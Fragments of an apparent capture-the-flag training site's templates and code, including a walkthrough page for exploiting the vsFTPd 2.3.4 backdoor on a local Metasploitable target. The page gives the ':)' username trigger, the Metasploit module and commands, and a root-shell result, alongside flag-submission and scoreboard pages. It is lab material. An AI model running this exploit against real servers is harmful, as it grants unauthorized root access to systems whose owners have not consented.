        ...
        .step h3 { font-family: 'Orbitron', sans-serif; color: #ffff00; font-size: 1.3em; text-shadow: 0 0 12px #ffff00; margin-bottom: 15px; position: relative; }
        .code {
            background: #050508;
            border: 1px solid #00ff00;
            ...
            text-shadow: 0 0 5px #00ff00;
            white-space: pre-wrap; margin: 15px 0;
            box-shadow: 0 0 15px rgba(0,255,0,0.2), inset 0 0 30px rgba(0,255,0,0.03);
            position: relative;
        }
        .code::before { content: 'root@cyberdemons:~# '; color: #ff0000; text-shadow: 0 0 5px #ff0000; }
        .hint {
            background: linear-gradient(135deg, #2e0a1a 0%, #1a0a2e 100%);
            border: 2px solid #ff3366;
            border-radius: 15px; padding: 25px; margin: 30px 0;
        ...
        .hint strong { color: #ff3366; font-size: 1.2em; text-shadow: 0 0 12px #ff3366; }
        .hint code { background: #050508; padding: 4px 10px; border-radius: 4px; color: #ffff00; border: 1px solid #ffff00; font-size: 0.95em; }
        ...
        .nav a:hover { background: #ff0000; color: #0a0a0f; box-shadow: 0 0 40px #ff0000; transform: scale(1.05); }
        .warning {
        ...
        .warning strong { color: #ff0000; text-shadow: 0 0 8px #ff0000; }
        .cyber-box {
            position: relative;
            padding: 5px;
        }
        ...
        .cyber-box::before { top: -5px; left: -5px; border-right: none; border-bottom: none; }
        .cyber-box::after { bottom: -5px; right: -5px; border-left: none; border-top: none; }
        .status-bar {
        ...
        .status-dot.red { background: #ff0000; box-shadow: 0 0 10px #ff0000; }
        .status-dot.green { background: #00ff00; box-shadow: 0 0 10px #00ff00; }
        .status-dot.cyan { background: #00ffff; box-shadow: 0 0 10px #00ffff; }
...
<body>
    <div class="scanline"></div>
    <div class="container">
        <h1>CYBERDEMON RAID DOMAIN</h1>
        <div class="subtitle">// vsFTPd 2.3.4 BACKDOOR EXPLOIT //</div>
        
        <div class="status-bar">
            <div class="status-item"><span class="status-dot red"></span> THREAT LEVEL: CRITICAL</div>
            <div class="status-item"><span class="status-dot green"></span> EXPLOIT: ACTIVE</div>
            <div class="status-item"><span class="status-dot cyan"></span> ACCESS: ROOT</div>
        </div>
        
        <div class="divider"></div>
        
        <div class="target cyber-box">
            <h2>Target Acquired</h2>
            <p>Host: <strong>127.0.0.1</strong> (Metasploitable)</p>
            <p>FTP Port: <strong>2122</strong> | Backdoor Port: <strong>6200</strong></p>
            <p>Trigger: <strong>USER contains :)</strong> opens root shell</p>
        </div>
        
        <div class="info">
            <h2>Exploit Intel</h2>
            <p>vsFTPd 2.3.4 contains a deliberate backdoor inserted via supply chain attack. When a username containing <code style="background:#050508;padding:3px 8px;border:1px solid #00ff00;color:#00ff00;border-radius:4px;">:)</code> is sent, vsFTPd opens a root shell on port 6200. Full system compromise in 3 commands.</p>
        </div>
        
        <div class="warning">
            <strong>[ WARNING ]</strong> This exploit must run from inside the Docker network. Host-side MSF sees Docker port proxies as always open, triggering false "backdoor already in-use" errors.
        </div>
        
        <div class="divider"></div>
        
        <div class="step cyber-box">
            <h3>Step 1: Initialize Framework</h3>
            <div class="code">msfconsole -q</div>
        </div>
        
        <div class="step cyber-box">
            <h3>Step 2: Arm the Payload</h3>
            <div class="code">use exploit/unix/ftp/vsftpd_234_backdoor</div>
        </div>
        
        <div class="step cyber-box">
            <h3>Step 3: Lock Target</h3>
...
set AutoCheck false</div>
        ...
        <div class="step cyber-box">
            <h3>Step 4: Execute Raid</h3>
            <div class="code">exploit</div>
            <p style="margin-top: 10px; color: #00ffff;">Result: <code style="background:#050508;padding:3px 8px;border:1px solid #00ff00;color:#00ff00;border-radius:4px;">uid=0(root) gid=0(root)</code> — Full access acquired</p>
        </div>
        
        <div class="step cyber-box">
            <h3>Step 5: Retrieve Flag</h3>
...
<html>
<head>
    <title>CYBERDEMON CTF - User Profiles</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
...
def ctf_submit():
    ...
    <html>
    <head>
        <title>CYBERDEMON CTF - Submit Flag</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
            ...
            .submit-box {
                ...
                border-radius: 20px; padding: 50px 40px;
                width: 650px;
                box-shadow: 0 0 40px rgba(0,255,255,0.3), inset 0 0 40px rgba(0,255,255,0.03);
                position: relative; z-index: 3;
            }
            h2 {
                font-family: 'Orbitron', sans-serif;
                color: #00ffff; font-size: 1.8em;
            ...
            .progress-text { color: #888; font-size: 1em; }
            .progress-bar {
            ...
            select:focus, input[type="text"]:focus {
                border-color: #00ffff; box-shadow: 0 0 15px rgba(0,255,255,0.3);
            }
            select option { background: #0d1b2a; color: #00ffff; }
            button[type="submit"] {
    ...
    <body>
        ...
        <div class="submit-box">
            ...
            <div class="progress">
                <span class="progress-text">Progress: {{ solved|length }} / {{ tools|length }} tools</span>
            ...
            <form method="POST">
                <select name="tool_name" required>
                    ...
                    <option value="{{ key }}" {{ 'disabled' if key in solved }}>
                        {{ tool.icon }} {{ tool.name }} ({{ tool.points }}pts) {{ '[DONE]' if key in solved else '' }}
                    </option>
                    {% endfor %}
                </select>
                <input type="text" name="flag" placeholder="Enter FLAG{...}" required>
...
def ctf_scoreboard():
    ...
    <html>
    <head>
        <title>CYBERDEMON CTF - Scoreboard</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
            ...
            .container { max-width: 1000px; margin: 0 auto; padding: 40px 20px; position: relative; z-index: 3; }
            h1 {
                font-family: 'Orbitron', sans-serif;
                font-size: 2.5em; font-weight: 900;
                color: #ffff00; text-align: center;
            ...
            td:first-child { border-left: 2px solid #333; border-radius: 10px 0 0 10px; }
            td:last-child { border-right: 2px solid #333; border-radius: 0 10px 10px 0; }
            tr:hover td { border-color: #ff00ff; box-shadow: 0 0 15px rgba(255,0,255,0.15); }
            .gold {
                color: #ffd700;
                font-family: 'Orbitron', sans-serif;
            ...
            .score-val {
                color: #00ffff; font-family: 'Orbitron', sans-serif;
                text-shadow: 0 0 8px #00ffff; font-size: 1.1em;
            }
            .nav {
                text-align: center; margin-top: 40px;
                padding-top: 30px; border-top: 2px solid #333;
            }
            .nav a {
                color: #ff00ff; margin: 0 25px;
                text-decoration: none; font-family: 'Orbitron', sans-serif;
                font-size: 1em; padding: 12px 28px;
        ...
        <div class="container">
            ...
            <table>
                ...
                <tr>
                    ...
                    <td style="color: #ff00ff; text-shadow: 0 0 5px #ff00ff;">{{ player }}</td>
                    <td><span class="score-val">{{ data.total }} pts</span></td>
